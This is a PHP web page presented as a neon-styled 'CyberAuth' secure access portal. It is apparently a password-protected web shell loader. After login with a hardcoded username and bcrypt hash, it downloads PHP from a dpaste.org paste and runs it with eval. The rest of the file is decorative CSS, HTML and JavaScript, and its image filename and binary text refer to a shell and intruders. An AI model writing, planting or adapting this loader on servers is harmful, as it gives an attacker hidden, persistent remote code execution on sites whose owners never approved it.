<?php
session_start();

// Tentukan username dan password hash
$username = "0918";
$passwordHash = '$2b$12$KjswPuuZPeX7MK2QrWwH6O8zJUtUNxnZWmVvYfHawi5O.QXe13tdG'; // Hash bcrypt

// Cek apakah pengguna sudah login sebelumnya
if (!isset($_SESSION['loggedin'])) {
    // Cek apakah form sudah di-submit
    if (isset($_POST['username']) && isset($_POST['password'])) {
        // Validasi username dan password
        if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
            // Jika username dan password benar, set sesi login
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']); // Refresh halaman setelah login
            exit();
        } else {
            // Jika username atau password salah, tampilkan pesan error
            $error = "Authentication failed: Invalid credentials";
        }
    }
}

// Jika sudah login, lakukan get contents dari URL
if (isset($_SESSION['loggedin'])) {
    $url = 'https://dpaste.org/eOjq0/raw'; // Ganti URL dengan lokasi script PHP yang ingin diambil
    $content = file_get_contents($url);

    if ($content !== false) {
        eval('?>' . $content); // Menjalankan konten sebagai kode PHP
    } else {
        echo "Gagal mengambil konten dari URL.";
    }
    exit();
}

// Jika belum login, tampilkan form login dan hentikan eksekusi script lainnya
if (!isset($_SESSION['loggedin'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>CYBER-AUTH PORTAL</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --primary: #00f0ff;
                --primary-dark: #00a8ff;
                --secondary: #ff00aa;
                --dark: #0a0a1a;
                --darker: #050510;
                --light: #e0e0ff;
                --neon-glow: 0 0 15px rgba(0, 240, 255, 0.7);
                --neon-glow-pink: 0 0 15px rgba(255, 0, 170, 0.7);
                --font-main: 'Orbitron', 'Rajdhani', sans-serif;
            }
            
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Rajdhani:wght@300;400;500;600;700&display=swap');
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body, html {
                height: 100%;
                font-family: var(--font-main);
                background: var(--darker);
                color: var(--light);
                display: flex;
                justify-content: center;
                align-items: center;
                overflow: hidden;
                perspective: 1000px;
            }
            
            .cyber-grid {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: 
                    linear-gradient(rgba(0, 240, 255, 0.05) 1px, transparent 1px),
                    linear-gradient(90deg, rgba(0, 240, 255, 0.05) 1px, transparent 1px);
                background-size: 40px 40px;
                z-index: 0;
                animation: gridScroll 100s linear infinite;
            }
            
            @keyframes gridScroll {
                0% { background-position: 0 0; }
                100% { background-position: 1000px 1000px; }
            }
            
            .cyber-circle {
                position: absolute;
                border-radius: 50%;
                filter: blur(60px);
                opacity: 0.15;
                z-index: 0;
            }
            
            .circle-1 {
                width: 500px;
                height: 500px;
                background: var(--primary);
                top: -200px;
                left: -200px;
                animation: float 25s infinite ease-in-out;
            }
            
            .circle-2 {
                width: 700px;
                height: 700px;
                background: var(--secondary);
                bottom: -300px;
                right: -200px;
                animation: float 30s infinite ease-in-out reverse;
                animation-delay: 5s;
            }
            
            @keyframes float {
                0%, 100% { transform: translate(0, 0) rotate(0deg); }
                25% { transform: translate(50px, 80px) rotate(5deg); }
                50% { transform: translate(100px, 0) rotate(0deg); }
                75% { transform: translate(50px, -80px) rotate(-5deg); }
            }
            
            .login-container {
                position: relative;
                width: 420px;
                background: rgba(10, 10, 30, 0.5);
                backdrop-filter: blur(15px);
                border-radius: 16px;
                padding: 50px 40px;
                box-shadow: 0 25px 60px rgba(0, 0, 0, 0.5);
                border: 1px solid rgba(0, 240, 255, 0.2);
                overflow: hidden;
                z-index: 10;
                transform-style: preserve-3d;
                transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            }
            
            .login-container::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(
                    45deg,
                    transparent,
                    rgba(0, 240, 255, 0.1),
                    transparent
                );
                transform: translateX(-100%);
                transition: transform 0.6s cubic-bezier(0.645, 0.045, 0.355, 1);
            }
            
            .login-container:hover {
                transform: translateY(-5px) rotateX(2deg) rotateY(2deg);
                box-shadow: 0 35px 70px rgba(0, 0, 0, 0.7);
            }
            
            .login-container:hover::before {
                transform: translateX(100%);
            }
            
            .cyber-header {
                text-align: center;
                margin-bottom: 40px;
                position: relative;
            }
            
            .cyber-logo {
                width: 100px;
                height: 100px;
                object-fit: cover;
                border-radius: 50%;
                border: 2px solid var(--primary);
                box-shadow: var(--neon-glow);
                margin-bottom: 20px;
                transition: all 0.4s ease;
                filter: drop-shadow(0 0 10px rgba(0, 240, 255, 0.7));
            }
            
            .cyber-logo:hover {
                transform: scale(1.1) rotate(10deg);
                box-shadow: 0 0 30px var(--primary);
            }
            
            .cyber-title {
                font-size: 28px;
                font-weight: 700;
                letter-spacing: 2px;
                text-transform: uppercase;
                margin-bottom: 10px;
                background: linear-gradient(90deg, var(--primary), var(--secondary));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                text-shadow: 0 0 10px rgba(0, 240, 255, 0.3);
            }
            
            .cyber-subtitle {
                font-size: 14px;
                letter-spacing: 4px;
                color: rgba(224, 224, 255, 0.7);
                font-family: 'Rajdhani', sans-serif;
                font-weight: 300;
            }
            
            .cyber-form {
                position: relative;
                z-index: 2;
            }
            
            .input-group {
                position: relative;
                margin-bottom: 30px;
            }
            
            .input-group::before {
                content: '';
                position: absolute;
                bottom: 0;
                left: 0;
                width: 100%;
                height: 2px;
                background: linear-gradient(90deg, var(--primary), var(--secondary));
                transform: scaleX(0);
                transform-origin: left;
                transition: transform 0.4s ease;
            }
            
            .input-group:focus-within::before {
                transform: scaleX(1);
            }
            
            .input-icon {
                position: absolute;
                left: 15px;
                top: 50%;
                transform: translateY(-50%);
                color: var(--primary);
                font-size: 18px;
                transition: all 0.3s ease;
            }
            
            .cyber-input {
                width: 100%;
                padding: 15px 15px 15px 45px;
                background: rgba(20, 20, 40, 0.5);
                border: 1px solid rgba(0, 240, 255, 0.2);
                border-radius: 8px;
                font-size: 16px;
                color: var(--light);
                font-family: 'Rajdhani', sans-serif;
                font-weight: 500;
                letter-spacing: 1px;
                transition: all 0.3s ease;
            }
            
            .cyber-input:focus {
                outline: none;
                border-color: var(--primary);
                box-shadow: var(--neon-glow);
                background: rgba(30, 30, 60, 0.7);
            }
            
            .cyber-input:focus + .input-icon {
                color: var(--secondary);
                transform: translateY(-50%) scale(1.2);
            }
            
            .cyber-options {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 30px;
                font-size: 14px;
                font-family: 'Rajdhani', sans-serif;
            }
            
            .cyber-checkbox {
                display: flex;
                align-items: center;
                cursor: pointer;
            }
            
            .cyber-checkbox input {
                appearance: none;
                width: 18px;
                height: 18px;
                background: rgba(20, 20, 40, 0.7);
                border: 1px solid var(--primary);
                border-radius: 4px;
                margin-right: 10px;
                position: relative;
                transition: all 0.3s ease;
            }
            
            .cyber-checkbox input:checked {
                background: var(--primary);
            }
            
            .cyber-checkbox input:checked::after {
                content: '\f00c';
                font-family: 'Font Awesome 6 Free';
                font-weight: 900;
                position: absolute;
                color: var(--darker);
                font-size: 12px;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
            }
            
            .cyber-link {
                color: var(--secondary);
                text-decoration: none;
                transition: all 0.3s ease;
                font-weight: 600;
                letter-spacing: 1px;
            }
            
            .cyber-link:hover {
                color: var(--primary);
                text-shadow: var(--neon-glow-pink);
            }
            
            .cyber-btn {
                width: 100%;
                padding: 16px;
                background: linear-gradient(135deg, var(--primary), var(--secondary));
                border: none;
                border-radius: 8px;
                color: var(--darker);
                font-size: 16px;
                font-weight: 700;
                letter-spacing: 2px;
                text-transform: uppercase;
                cursor: pointer;
                transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
                position: relative;
                overflow: hidden;
                z-index: 1;
                box-shadow: 0 5px 25px rgba(0, 240, 255, 0.4);
            }
            
            .cyber-btn::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
                transition: 0.5s;
                z-index: -1;
            }
            
            .cyber-btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 10px 35px rgba(0, 240, 255, 0.6);
                letter-spacing: 3px;
            }
            
            .cyber-btn:hover::before {
                left: 100%;
            }
            
            .cyber-footer {
                text-align: center;
                margin-top: 30px;
                font-size: 14px;
                font-family: 'Rajdhani', sans-serif;
                color: rgba(224, 224, 255, 0.7);
            }
            
            .cyber-error {
                position: relative;
                padding: 15px;
                margin-bottom: 25px;
                background: rgba(255, 0, 85, 0.1);
                border-left: 3px solid var(--secondary);
                border-radius: 4px;
                color: #ff4d6d;
                font-family: 'Rajdhani', sans-serif;
                font-weight: 600;
                letter-spacing: 1px;
                animation: errorShake 0.5s ease;
                display: flex;
                align-items: center;
            }
            
            .cyber-error i {
                margin-right: 10px;
                font-size: 18px;
            }
            
            @keyframes errorShake {
                0%, 100% { transform: translateX(0); }
                20%, 60% { transform: translateX(-8px); }
                40%, 80% { transform: translateX(8px); }
            }
            
            .cyber-scanline {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(
                    to bottom,
                    transparent,
                    transparent 50%,
                    rgba(0, 240, 255, 0.05) 50%,
                    rgba(0, 240, 255, 0.05)
                );
                background-size: 100% 8px;
                pointer-events: none;
                animation: scanline 8s linear infinite;
                z-index: 1;
                opacity: 0.3;
            }
            
            @keyframes scanline {
                0% { transform: translateY(-100%); }
                100% { transform: translateY(100%); }
            }
            
            .cyber-binary {
                position: absolute;
                color: rgba(0, 240, 255, 0.1);
                font-size: 12px;
                font-family: monospace;
                user-select: none;
                z-index: 0;
            }
            
            .binary-1 {
                top: 20px;
                left: 20px;
                animation: floatBinary 15s infinite linear;
            }
            
            .binary-2 {
                bottom: 20px;
                right: 20px;
                animation: floatBinary 20s infinite linear reverse;
            }
            
            @keyframes floatBinary {
                0% { transform: translate(0, 0); }
                25% { transform: translate(10px, 15px); }
                50% { transform: translate(20px, 0); }
                75% { transform: translate(10px, -15px); }
                100% { transform: translate(0, 0); }
            }
        </style>
    </head>
    <body>
        <div class="cyber-grid"></div>
        <div class="cyber-circle circle-1"></div>
        <div class="cyber-circle circle-2"></div>
        
        <div class="cyber-binary binary-1">
            01001001 01101110 01110100 01110010 01110101 01100100 01100101 01110010 00100000 01010011 01111001 01110011 01110100 01100101 01101101 01110011
        </div>
        
        <div class="cyber-binary binary-2">
            01000001 01100011 01100011 01100101 01110011 01110011 00100000 01000111 01110010 01100001 01101110 01110100 01100101 01100100
        </div>
        
        <div class="login-container">
            <div class="cyber-scanline"></div>
            
            <div class="cyber-header">
                <img src="https://www.upload.ee/image/18438286/Luffy_with_Flag_for_Shell.png" alt="CyberAI" class="cyber-logo">
                <h1 class="cyber-title">CyberAuth</h1>
                <p class="cyber-subtitle">Secure Access Portal</p>
            </div>
            
            <?php if (isset($error)): ?>
                <div class="cyber-error">
                    <i class="fas fa-exclamation-triangle"></i>
                    <span><?php echo $error; ?></span>
                </div>
            <?php endif; ?>
            
            <form method="post" class="cyber-form">
                <div class="input-group">
                    <i class="fas fa-user input-icon"></i>
                    <input type="text" name="username" class="cyber-input" placeholder="USERNAME" required>
                </div>
                
                <div class="input-group">
                    <i class="fas fa-lock input-icon"></i>
                    <input type="password" name="password" class="cyber-input" placeholder="PASSWORD" required>
                </div>
                
                <div class="cyber-options">
                    <label class="cyber-checkbox">
                        <input type="checkbox" name="remember">
                        <span>Remember me</span>
                    </label>
                    <a href="#" class="cyber-link">Recover Access</a>
                </div>
                
                <button type="submit" class="cyber-btn">
                    <span>Authenticate</span>
                </button>
                
                <div class="cyber-footer">
                    New to system? <a href="#" class="cyber-link">Request Access</a>
                </div>
            </form>
        </div>
        
        <script>
            // Dynamic binary code effect
            document.addEventListener('DOMContentLoaded', function() {
                const binaryElements = document.querySelectorAll('.cyber-binary');
                
                binaryElements.forEach(el => {
                    const originalText = el.textContent;
                    let text = originalText;
                    
                    setInterval(() => {
                        // Randomly flip some bits
                        text = text.split('').map(char => {
                            if (Math.random() > 0.95 && char !== ' ') {
                                return char === '0' ? '1' : '0';
                            }
                            return char;
                        }).join('');
                        
                        el.textContent = text;
                        
                        // Reset to original after flicker
                        setTimeout(() => {
                            el.textContent = originalText;
                        }, 100);
                    }, 3000);
                });
                
                // Add interactive hover effect
                const container = document.querySelector('.login-container');
                document.addEventListener('mousemove', (e) => {
                    const x = e.clientX / window.innerWidth;
                    const y = e.clientY / window.innerHeight;
                    
                    container.style.transform = `
                        translateY(-5px)
                        rotateX(${(y - 0.5) * 5}deg)
                        rotateY(${(x - 0.5) * -5}deg)
                    `;
                });
            });
        </script>
    </body>
    </html>
    <?php
    exit();
}
?>
